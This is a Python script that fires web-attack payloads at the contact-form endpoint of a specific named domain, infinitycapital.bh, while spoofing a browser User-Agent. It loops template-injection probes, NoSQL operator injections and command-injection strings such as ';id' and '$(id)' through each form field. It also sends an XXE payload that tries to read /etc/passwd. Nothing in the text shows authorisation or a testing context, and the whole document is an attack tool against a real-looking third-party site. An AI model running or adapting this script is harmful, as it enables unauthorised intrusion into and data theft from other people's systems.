import requests, sys
B="https://www.infinitycapital.bh/api/send"
H={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36"}
def post(**kw):
    d={"fname":"a","lname":"b","areacode":"973","tel":"5551234","cname":"c","subject":"s","msg":"m","check":"on"}
    d.update(kw)
    try:
        r=requests.post(B,data=d,headers=H,timeout=25)
        return r.status_code,r.text[:400]
    except Exception as e:
        return "ERR",str(e)[:200]

print("== targets validation ==")
for t in ["test","probe@example.com","{{7*7}}","${7*7}","a@example.com","<%= 7*7 %>"]:
    print(repr(t), post(targets=t))

print("== SSTI in each field ==")
for f in ["fname","lname","cname","subject","msg"]:
    for pl in ["{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","{{config}}"]:
        c,t=post(**{f:pl})
        if "49" in t or "config" in t.lower():
            print("HIT",f,pl,c,t)
print("ssti done")

print("== NoSQLi operator forms ==")
import json
for f in ["fname","cname","subject","msg"]:
    for pl in ['$ne','$gt','{"$ne":1}','{"$gt":""}','{"$regex":".*"}']:
        c,t=post(**{f:pl})
        print(f,repr(pl),c,t[:120])

print("== CMDi ==")
for f in ["fname","cname","subject","msg"]:
    for pl in [";id","$(id)","`id`","|id","&& whoami"]:
        c,t=post(**{f:pl})
        print(f,repr(pl),c,t[:120])

print("== XXE / content-type xml ==")
xml='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
try:
    r=requests.post(B,data=xml,headers={**H,"Content-Type":"application/xml"},timeout=25)
    print("xml",r.status_code,r.text[:300])
except Exception as e: print(e)